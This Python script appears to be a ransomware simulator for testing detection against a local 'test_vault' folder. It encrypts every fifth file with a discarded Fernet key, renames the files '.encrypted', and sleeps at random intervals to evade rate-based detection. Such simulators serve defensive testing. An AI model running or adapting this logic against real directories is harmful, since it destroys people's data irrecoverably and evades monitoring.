import os
import time
import random
from cryptography.fernet import Fernet

VAULT_DIR = "./test_vault"

def attack_intermittent():
    print("[*] Starting ATTACK: The Intermittent (Stealthy/Slow)")
    
    if not os.path.exists(VAULT_DIR):
        print(f"[!] Error: {VAULT_DIR} not found. Run setup_vault.py first.")
        return

    key = Fernet.generate_key()
    fernet = Fernet(key)
    
    files = [f for f in os.listdir(VAULT_DIR) if os.path.isfile(os.path.join(VAULT_DIR, f)) and not f.endswith(".encrypted")]
    files.sort() # predictable order to skip every 5th

    for i, filename in enumerate(files):
        # Only attack every 5th file
        if (i + 1) % 5 != 0:
            continue
            
        file_path = os.path.join(VAULT_DIR, filename)
        
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            encrypted = fernet.encrypt(data)
            
            with open(file_path, "wb") as f:
                f.write(encrypted)
            
            new_path = file_path + ".encrypted"
            os.rename(file_path, new_path)
            
            print(f"    [!] Stealth Encrypted: {filename}")
            
            # Sleep to evade speed detection
            sleep_time = random.uniform(0.5, 2.0)
            print(f"        (Sleeping {sleep_time:.2f}s...)")
            time.sleep(sleep_time)
            
        except Exception as e:
            print(f"    [x] Failed to encrypt {filename}: {e}")

    print("[*] Stealth Attack complete.")

if __name__ == "__main__":
    attack_intermittent()
